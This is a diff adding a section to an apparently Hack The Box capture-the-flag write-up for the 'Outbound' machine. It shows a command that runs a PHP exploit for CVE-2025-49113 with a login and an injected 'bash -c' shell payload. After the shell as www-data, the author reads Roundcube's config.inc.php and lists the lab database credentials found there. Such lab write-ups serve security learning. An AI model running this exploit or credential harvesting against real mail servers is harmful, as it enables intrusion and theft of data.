@@ -46,3 +46,19 @@ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bas
 Now, with a shell as www-data amd you can see the exploit executed sucessfully 
 
 ![www-data](/htb2.png)
+After this, I began looking around for important files and directories. Eventually, I came across the config directory located at:
+```bash
+ /var/www/html/roundcube/public_html/roundcube/config
+``` 
+Inside this directory, I found the config.inc.php file  
+
+![Image](/config.png)
+
+Now, since I had the database credentials clearly listed in the config.inc.php file, I could interact directly with the database. 
+The credentials were as follows:
+
+```bash
+DB User: roundcube  
+DB Pass: RCDBPass2025  
+DB Name: roundcube  
+```
